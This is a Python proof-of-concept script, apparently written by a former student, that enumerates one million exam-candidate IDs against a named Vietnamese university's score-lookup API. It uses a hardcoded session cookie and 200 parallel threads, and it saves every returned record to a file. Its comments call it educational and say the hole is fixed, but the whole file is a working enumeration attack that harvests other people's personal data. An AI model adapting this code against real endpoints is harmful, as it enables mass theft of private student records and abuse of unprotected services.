# 2023 DGNL API ENDPOINT EXPLOIT PoC
# Originally written by github.com/thaisonho
# Coded on my old HP Laptop running i7 3rd generation
# after the score publication of DGNL 2023, second exam
# around May 2023
# -----------------------------------------------------
# This script is for educational purposes only.
# The vuneralble exploited in this script have been fixed,
# and the API endpoint was taken down, no longer active.

import requests
import json
import time
import threading
import signal
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "https://thinangluc.vnuhcm.edu.vn/dgnl/api-dgnl/app/tra-cuu-thong-tin-ho-so/v1?tuychon=KETQUATHI"

HEADERS = {
    'Host': 'thinangluc.vnuhcm.edu.vn',
    'Cookie': 'JSESSIONID=ACF79E81A5DE80F828C6BDCE8437CADA', # This will expired
                                                             # When I'm in highschool I doesn't know how to
                                                             # retrieved cookies, so I hardcoded it in
                                                             # and use a chrome extension that helps me 
                                                             # keeping it alive. All it did was simulated user's
                                                             # click so that the session is alive all the time.
                                                             # Yes, the session only start timing out when 
                                                             # it no longers received any user's activity.
                                                             # The better approach is to perform a POST /login
                                                             # and get Cookie from it.
    'Sec-Ch-Ua': '',
    'Accept-Language': 'vi',
    'Sec-Ch-Ua-Mobile':'?0',
    'Authorization': '',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'Sec-Ch-Ua-Platform': '""',
    'Origin': 'https://thinangluc.vnuhcm.edu.vn',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://thinangluc.vnuhcm.edu.vn/dgnl/app/home',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close' # because of many request, it should be keep-alive,
                          # but at that time, with my lack of skill, I just keep
                          # the header as it like the browser.
}

START_ID_NUM = 23000000
END_ID_NUM = 24000000
MAX_WORKERS = 200 # At that time, there weren't any blacklist,
                  # IP blocking, timeout, etc. No any security fence!
                  # So I just goes brrr brrr on this one.
                  # Why not a bigger number? My old laptop just couldn't handled it lol.
OUTPUT_FILE = 'crawled_data.txt'
PROGRESS_FILE = 'last_id.txt'

# Lock for thread-safe file writing and progress saving
file_lock = threading.Lock()
# Variable to keep track of the last ID processed or attempted
# Init with a value before the start to handle the very first run
last_processed_id_num = START_ID_NUM - 1

# shut down flag to handle KeyboardInterupt
shutdown_flag = threading.Event()

def format_id_payload(id_num: int) -> str:
    id_str = str(id_num).zfill(8)
    return f'"D{id_str}"'

def load_start_id() -> int:
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE, 'r') as f:
                content = f.read().strip()
                if content:
                    saved_id = int(content)
                    print(f"Resuming from ID number: {saved_id}")
                    return saved_id
                else:
                    print(f"Progress file '{PROGRESS_FILE}' is empty. Starting from beginning.")
                    return START_ID_NUM
        except (IOError, ValueError) as e:
            print(f"Error reading progress file '{PROGRESS_FILE}': {e}. Starting from beginning.")
            return START_ID_NUM
    else:
        print(f"No progress file found. Starting from ID number: {START_ID_NUM}")
        return START_ID_NUM

def save_progress(id_num_to_save: int):
    """Saves the next ID number to start from in the progress file."""
    next_id = id_num_to_save + 1
    try:
        with file_lock: # make sure only one thread to write at one time.
            with open(PROGRESS_FILE, 'w') as f:
                f.write(str(next_id))
            global last_processed_id_num
            last_processed_id_num = id_num_to_save
    except IOError as e:
        print(f"Error saving progress for ID {next_id}: {e}")

def fetch_and_save(id_num: int):
    """Fetches data for a single ID and saves it if successful."""
    if shutdown_flag.is_set():
        return # Stop processing if shutdown is signalled

    payload = format_id_payload(id_num)
    thread_id = threading.current_thread().name

    try:
        current_headers = HEADERS.copy()
        current_headers['Content-Length'] = str(len(payload))

        resp = requests.post(URL, headers=current_headers, data=payload, timeout=10) # Added timeout
        resp.raise_for_status() # if met a bad status code, it will raise exception.

        # Check response content
        try:
            response_json = resp.json()
            if response_json.get('data'):
                print(f"[{thread_id}] ID {payload} -> SUCCESS")
                jsonData = response_json['data']
                with file_lock:
                    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                        f.write(json.dumps(jsonData, ensure_ascii=False))
                        f.write('\n')
            else:
                print(f"[{thread_id}] ID {payload} -> No data found")

        except json.JSONDecodeError:
            print(f"[{thread_id}] ID {payload} -> Failed (Invalid JSON response)")
        except KeyError:
             print(f"[{thread_id}] ID {payload} -> Failed (Key 'data' not found in JSON response)")


    except requests.exceptions.RequestException as e:
        print(f"[{thread_id}] ID {payload} -> FAILED ({type(e).__name__}). Check connection or endpoint.")
        # The timeout should be here,
        # but it really didn't cause this API was poorly written af.
        # It just doesn't care how much I spammed.
        # But now when I look back, I parly understand why.
        # Back when the score publishing, the server have to handles tons
        # of request from student who are urging to 
        # know how well they score.
        # So I think the devs just let the flow go and turn off all the 
        # anti-spam stuff (if there was any back then).
        time.sleep(1)
    except Exception as e:
        print(f"[{thread_id}] ID {payload} -> FAILED (Unexpected error: {e})")

    with file_lock:
        global last_processed_id_num
        last_processed_id_num = max(last_processed_id_num, id_num)


def signal_handler(sig, frame):
    print("\nCtrl+C detected! Attempting shutdown...")
    shutdown_flag.set()
    
    print(f"Will attempt to save progress marker after ID: D{str(last_processed_id_num).zfill(8)}")


def main():
    global last_processed_id_num

    signal.signal(signal.SIGINT, signal_handler)

    current_start_id = load_start_id()
    last_processed_id_num = current_start_id - 1

    if current_start_id >= END_ID_NUM:
        print("Starting ID is already at or beyond the end ID. Nothing to do.")
        return

    print(f"Starting crawl from D{str(current_start_id).zfill(8)} to D{str(END_ID_NUM - 1).zfill(8)}")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {}
        try:
            for id_num in range(current_start_id, END_ID_NUM):
                if shutdown_flag.is_set():
                    print("Shutdown signalled, stopping submission of new tasks.")
                    break # stop submitting new tasks

                future = executor.submit(fetch_and_save, id_num)
                futures[future] = id_num

            print("All tasks submitted. Waiting for completion...")
            for future in as_completed(futures):
                if shutdown_flag.is_set():
                    # allow running threads to be successfully executed.
                    pass

                try:
                    future.result()
                except Exception as e:
                    failed_id = futures[future]
                    print(f"Task for ID {failed_id} encountered an error during execution: {e}")

        except KeyboardInterrupt:
            # This block might not be reached if the signal handler works correctly,
            # but included as a fallback.
            print("\nKeyboardInterrupt caught in main loop. Shutting down.")
            shutdown_flag.set()

        except Exception as e:
            print(f"An unexpected error occurred in the main loop: {e}")
            shutdown_flag.set()

        finally:
            if last_processed_id_num >= START_ID_NUM -1 : # check if any processing was attempted
                 final_save_id = last_processed_id_num
                 print(f"\nProcess finished or interrupted. Saving progress marker: {final_save_id + 1}")
                 save_progress(final_save_id)
            else:
                 print("\nNo IDs were processed. Progress not saved.")


    if not shutdown_flag.is_set():
        print("\n============ CRAWL COMPLETE ============")
    else:
        print("\n============ CRAWL INTERRUPTED ============")
        print(f"Rerun the script to continue from ID: D{str(last_processed_id_num + 1).zfill(8)}")


if __name__ == "__main__":
    main()
